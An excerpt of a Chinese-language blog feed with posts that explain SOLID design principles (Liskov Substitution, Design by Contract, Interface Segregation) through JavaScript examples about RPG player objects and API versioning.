class="line"><span class="keyword">function</span> <span class="title function_">isHealthy</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">health</span> &gt; <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義一個函數，用於檢查玩家的名稱和傷害值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hasDesiredNameOrLowDamage</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">name</span> === <span class="string">&quot;foo&quot;</span> || player.<span class="property">damage</span> &lt; <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義一個函數，用於檢查玩家的名稱和敏捷度</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hasDesiredNameOrHighAgility</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">name</span> !== <span class="string">&quot;bar&quot;</span> || player.<span class="property">agility</span> &gt; <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義一個基本玩家函數，接受包含玩家屬性的物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createPlayer</span>(<span class="params">playerData</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name, health, damage &#125; = playerData;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    name,</span><br><span class="line">    health,</span><br><span class="line">    damage,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通用的檢查函數，每個玩家都可以使用</span></span><br><span class="line">    <span class="title function_">checkPlayerCondition</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">isHealthy</span>(player) &amp;&amp; <span class="title function_">hasDesiredNameOrLowDamage</span>(player);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義進階玩家函數，接受包含進階玩家屬性的物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createAdvancedPlayer</span>(<span class="params">advancedPlayerData</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name, health, damage, agility &#125; = advancedPlayerData;</span><br><span class="line">  <span class="keyword">const</span> player = <span class="title function_">createPlayer</span>(&#123; name, health, damage &#125;);</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...player,</span><br><span class="line">    agility,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 進階玩家特有的檢查函數</span></span><br><span class="line">    <span class="title function_">checkAdvancedPlayerCondition</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">hasDesiredNameOrHighAgility</span>(player);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通用的處理玩家資料函數，接受任何類型的玩家物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (player.<span class="title function_">checkPlayerCondition</span>()) &#123;</span><br><span class="line">    <span class="comment">// 做一些基本玩家的操作</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;player.name&#125;</span> 符合基本條件`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    player?.<span class="property">checkAdvancedPlayerCondition</span> &amp;&amp;</span><br><span class="line">    player?.<span class="title function_">checkAdvancedPlayerCondition</span>()</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// 做一些進階玩家的操作</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;player.name&#125;</span> 符合進階條件`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立玩家物件，使用包含屬性的物件作為參數</span></span><br><span class="line"><span class="keyword">const</span> player1 = <span class="title function_">createPlayer</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家1&quot;</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">10</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> player2 = <span class="title function_">createAdvancedPlayer</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家2&quot;</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">150</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">15</span>,</span><br><span class="line">  <span class="attr">agility</span>: <span class="number">20</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 處理玩家資料</span></span><br><span class="line"><span class="title function_">processPlayerData</span>(player1);</span><br><span class="line"><span class="comment">// 輸出:玩家1 符合基本條件</span></span><br><span class="line"><span class="title function_">processPlayerData</span>(player2);</span><br><span class="line"><span class="comment">// 輸出:玩家2 符合基本條件</span></span><br><span class="line"><span class="comment">// 輸出:玩家2 符合進階條件</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>影分身之術 X 里氏替換原則</title>
      <link href="/2023/10/06/simplify-your-life/liskov-substitution-principle/"/>
      <url>/2023/10/06/simplify-your-life/liskov-substitution-principle/</url>
      
        <content type="html"><![CDATA[<p>在模組化收納中，會希望符合規範的模組可以互相替換，想像一下我們有一個很多抽屜的櫃子，抽屜是設計成可替換的，如果今天櫃子的拼布抽屜髒了或壞了也可以改成木製或是塑膠製，這個概念就是里氏替換原則，而符合規範的概念則是契約式設計。</p><h2 id="里氏替換原則"><a href="#里氏替換原則" class="headerlink" title="里氏替換原則"></a>里氏替換原則</h2><p>里氏替換原則 (Liskov Substitution principle) 是對子類型的特別定義</p><blockquote><p>衍生類別 (子類) 物件可以在程式中代替其基礎類別 (超類) 物件</p></blockquote><p>舉個常見的手機多種登入方式來說，對於身份驗證和登入方式的設計，通常建議提供多個選項，各種登入方式（如 FaceID、圖形、PIN 碼、指紋等）可以互相替代，以滿足不同使用者的需求和偏好。</p><p>讓我們複習一下之前提到的情境描述，假設我們正在開發一個角色扮演遊戲 (RPG) 的程式，其中有不同類型的玩家，包括基本玩家和進階玩家，每個玩家類型都有自己的檢查條件，重構的目標是希望確保程式碼易於擴充，以應對未來可能新增的玩家類型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立玩家物件，使用包含屬性的物件作為參數</span></span><br><span class="line"><span class="keyword">const</span> player1 = <span class="title function_">createPlayer</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家1&quot;</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">10</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> player2 = <span class="title function_">createAdvancedPlayer</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家2&quot;</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">150</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">15</span>,</span><br><span class="line">  <span class="attr">agility</span>: <span class="number">20</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 處理玩家資料</span></span><br><span class="line"><span class="title function_">processPlayerData</span>(player1);</span><br><span class="line"><span class="comment">// 輸出:玩家1 符合基本條件</span></span><br><span class="line"><span class="title function_">processPlayerData</span>(player2);</span><br><span class="line"><span class="comment">// 輸出:玩家2 符合基本條件</span></span><br><span class="line"><span class="comment">// 輸出:玩家2 符合進階條件</span></span><br></pre></td></tr></table></figure><p>在這個例子中會有一個基礎的 <code>Player</code> 物件該有的規範，首先我們定義了一個基本的玩家函式 createPlayer，它接受包含玩家屬性的物件作為參數，這個函式包含擁有通用檢查函式的玩家物件，該函式確保了基本玩家類別遵循了 Player 介面 (LSP 的一部分)。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定義一個基本玩家函式，接受包含玩家屬性的物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createPlayer</span>(<span class="params">playerData</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name, health, damage &#125; = playerData;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    name,</span><br><span class="line">    health,</span><br><span class="line">    damage,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通用的檢查函式，每個玩家都可以使用</span></span><br><span class="line">    <span class="title function_">checkPlayerCondition</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">health</span> &gt; <span class="number">10</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">name</span> === <span class="string">&quot;foo&quot;</span> || <span class="variable language_">this</span>.<span class="property">damage</span> &lt; <span class="number">5</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接著，我們定義了進階玩家函式 createAdvancedPlayer，擴充了基本玩家，同樣接受包含進階玩家屬性的物件作為參數。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定義進階玩家函式，接受包含進階玩家屬性的物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createAdvancedPlayer</span>(<span class="params">advancedPlayerData</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name, health, damage, agility &#125; = advancedPlayerData;</span><br><span class="line">  <span class="keyword">const</span> player = <span class="title function_">createPlayer</span>(&#123; name, health, damage &#125;);</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...player,</span><br><span class="line">    agility,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 進階玩家特有的檢查函式</span></span><br><span class="line">    <span class="title function_">checkAdvancedPlayerCondition</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span> !== <span class="string">&quot;bar&quot;</span> || <span class="variable language_">this</span>.<span class="property">agility</span> &gt; <span class="number">20</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這確保了進階玩家類別同樣遵循了 Player 介面，擁有基本 <code>Player</code> 物件該有的規範和通用檢查函式 <code>checkPlayerCondition</code>，所以理論上要能替換基本玩家而不會對程式造成問題。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通用的處理玩家資料函式，接受任何類型的玩家物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (player.<span class="title function_">checkPlayerCondition</span>()) &#123;</span><br><span class="line">    <span class="comment">// 做一些基本玩家的操作</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;player.name&#125;</span> 符合基本條件`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    player?.<span class="property">checkAdvancedPlayerCondition</span> &amp;&amp;</span><br><span class="line">    player?.<span class="title function_">checkAdvancedPlayerCondition</span>()</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// 做一些進階玩家的操作</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;player.name&#125;</span> 符合進階條件`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 非常長的函式內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="契約式設計"><a href="#契約式設計" class="headerlink" title="契約式設計"></a>契約式設計</h2><p>契約式設計 (Design by Contract) 是一個非常重要的軟體設計原則，它強調一旦確立了契約或介面，就應該堅守下去，不輕易變更。</p><p>這個原則有助於確保系統的穩定性和可預測性，舉個常見的 API 版本號碼當例子，小編的第一個工作就需要提供 API 服務各種版本的 App，當需要對 API 做出變更或加入新功能時一定要注意相容舊版，這時候增加版本號碼是一個常見的做法，以確保現有的客戶端不會受到破壞。</p><ul><li><code>/api/v1/user-info</code></li><li><code>/api/v2/user-info</code></li></ul><p>在 API 設計中，一旦確立了一個特定的輸入和輸出格式，建議堅持不輕易變更它，因為這會影響到使用該 API 的客戶端應用程式。</p><p>每當對 API 的輸入或輸出格式進行重大變更時，可以建立一個新的版本在路徑中，使得新的客戶端可以選擇使用新版本，而不影響現有客戶端。</p><p>契約式設計原則有助於減少後續變更對現有功能的影響，同時確保用戶能夠方便地使用系統。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>把自己角色扮演好</title>
      <link href="/2023/10/05/simplify-your-life/interface-segregation-principle/"/>
      <url>/2023/10/05/simplify-your-life/interface-segregation-principle/</url>
      
        <content type="html"><![CDATA[<p>在之前的文章中有提出了當<a href="https://linyencheng.github.io/2023/09/18/simplify-your-life/reduce-items-of-the-same-type/">重複的東西一再出現的問題</a>，當時並沒有特別的去談一些理論和解決方法，但在後面幾天小編開始慢慢的置入 SOLID 中的</p><ul><li><a href="https://linyencheng.github.io/2023/09/25/simplify-your-life/single-responsibility-principle/">Single Responsibility Principle</a>: 減少同個區塊中不相關的邏輯</li><li><a href="https://linyencheng.github.io/2023/10/02/simplify-your-life/api-first-with-domain-model/">Open Closed Principle</a>: 對於擴展是開放的，但對於修改是封閉的</li><li><a href="https://linyencheng.github.io/2023/09/30/simplify-your-life/dependency-inversion-principle/">Dependency Inversion Principle</a>: 透過依賴的反轉，我們可以不再被物件牽制</li></ul><p>今天想來開箱另外一個設計程式時的介面隔離原則，談談透過介面的隔離來確保高內聚性 (Cohesion) 和低耦合性 (Coupling)，使程式碼易於理解、擴充和維護，一起來看看有沒有機會解決上次的問題吧。</p><h2 id="Interface-Segregation-Principle"><a href="#Interface-Segregation-Principle" class="headerlink" title="Interface Segregation Principle"></a>Interface Segregation Principle</h2><p>讓我們複習一下之前提到的情境描述，假設我們正在開發一個角色扮演遊戲 (RPG) 的程式，其中有不同類型的玩家，包括基本玩家和進階玩家，每個玩家類型都有自己的檢查條件，重構的目標是希望確保程式碼易於擴充，以應對未來可能新增的玩家類型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拆開</span></span><br><span class="line"><span class="comment">// 初始版本只有基本角色屬性</span></span><br><span class="line"><span class="keyword">const</span> player1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家1&quot;</span>,</span><br><span class="line">  <span class="attr">level</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">10</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一段時間後，遊戲需要更多的角色屬性</span></span><br><span class="line"><span class="keyword">const</span> player2 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家2&quot;</span>,</span><br><span class="line">  <span class="attr">level</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">150</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">15</span>,</span><br><span class="line">  <span class="attr">agility</span>: <span class="number">20</span>, <span class="comment">// 新需求:敏捷度</span></span><br><span class="line">  <span class="attr">inventory</span>: [<span class="string">&quot;劍&quot;</span>, <span class="string">&quot;盾&quot;</span>], <span class="comment">// 新需求:背包</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合起來</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params"></span></span><br><span class="line"><span class="params">  name,</span></span><br><span class="line"><span class="params">  level,</span></span><br><span class="line"><span class="params">  health,</span></span><br><span class="line"><span class="params">  damage,</span></span><br><span class="line"><span class="params">  agility,</span></span><br><span class="line"><span class="params">  inventory,</span></span><br><span class="line"><span class="params">  statusCode</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    health &gt; <span class="number">10</span> &amp;&amp;</span><br><span class="line">    (name === <span class="string">&quot;foo&quot;</span> || damage &lt; <span class="number">5</span>) &amp;&amp;</span><br><span class="line">    (name !== <span class="string">&quot;bar&quot;</span> || agility &gt; <span class="number">20</span>)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定義介面"><a href="#定義介面" class="headerlink" title="定義介面"></a>定義介面</h3><p>首先定義了 Player 的介面，包含了所有玩家類型都需要具備的通用屬性和方法。</p><p>但由於角色的不同，改善的方向應該是把角色分開，這樣每個角色都只會用到自己需要的屬性和方法。</p><ul><li>基本玩家: 透過 <code>createPlayer</code> 函數實現了 Player 介面，確保了基本玩家包含了通用的屬性遵循了 Player 介面</li><li>進階玩家: 透過 <code>createAdvancedPlayer</code> 函數擴充 Player 介面，確保了進階玩家不僅遵循了 Player 介面也包含了進階玩家特有的屬性</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定義一個函數，用於建立玩家物件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createPlayer</span>(<span class="params">playerData</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...playerData,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立玩家物件</span></span><br><span class="line"><span class="keyword">const</span> player1 = <span class="title function_">createPlayer</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家1&quot;</span>,</span><br><span class="line">  <span class="attr">level</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">10</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新需求:更多的角色屬性</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createAdvancedPlayer</span>(<span class="params">advancedPlayerData</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...<span class="title function_">createPlayer</span>(advancedPlayerData),</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立進階玩家物件</span></span><br><span class="line"><span class="keyword">const</span> player2 = <span class="title function_">createAdvancedPlayer</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家2&quot;</span>,</span><br><span class="line">  <span class="attr">level</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">150</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">15</span>,</span><br><span class="line">  <span class="attr">agility</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">inventory</span>: [<span class="string">&quot;劍&quot;</span>, <span class="string">&quot;盾&quot;</span>],</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新設計函數，只接受角色物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name, health, damage, agility &#125; = player;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    health &gt; <span class="number">10</span> &amp;&amp;</span><br><span class="line">    (name === <span class="string">&quot;foo&quot;</span> || damage &lt; <span class="number">5</span>) &amp;&amp;</span><br><span class="line">    (name !== <span class="string">&quot;bar&quot;</span> || agility &gt; <span class="number">20</span>)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通用處理函數"><a href="#通用處理函數" class="headerlink" title="通用處理函數"></a>通用處理函數</h3><p>處理通用處理函數的部分，這裡建立了 <code>processPlayerData</code> 函數，可以接受任何類型的玩家物件作為參數，目標是不直接依賴於特定的玩家類型讓函數更具通用性，方便未來新增更多的角色。</p><p>判斷的部份選擇把不同功能的判斷用 function 拆開，將這些條件拆分成獨立的函數可以提高程式碼的可讀性和維護性，這樣做讓每個檢查條件都有自己的名稱，更容易理解和測試。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定義一個函數，用於檢查玩家的健康狀態</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isHealthy</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">health</span> &gt; <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義一個函數，用於檢查玩家的名稱和傷害值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hasDesiredNameOrLowDamage</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">name</span> === <span class="string">&quot;foo&quot;</span> || player.<span class="property">damage</span> &lt; <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義一個函數，用於檢查玩家的名稱和敏捷度</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hasDesiredNameOrHighAgility</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">name</span> !== <span class="string">&quot;bar&quot;</span> || player.<span class="property">agility</span> &gt; <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新設計函數，只接受角色物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_">isHealthy</span>(player) &amp;&amp;</span><br><span class="line">    <span class="title function_">hasDesiredNameOrLowDamage</span>(player) &amp;&amp;</span><br><span class="line">    <span class="title function_">hasDesiredNameOrHighAgility</span>(player)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 這裡執行根據條件的操作</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  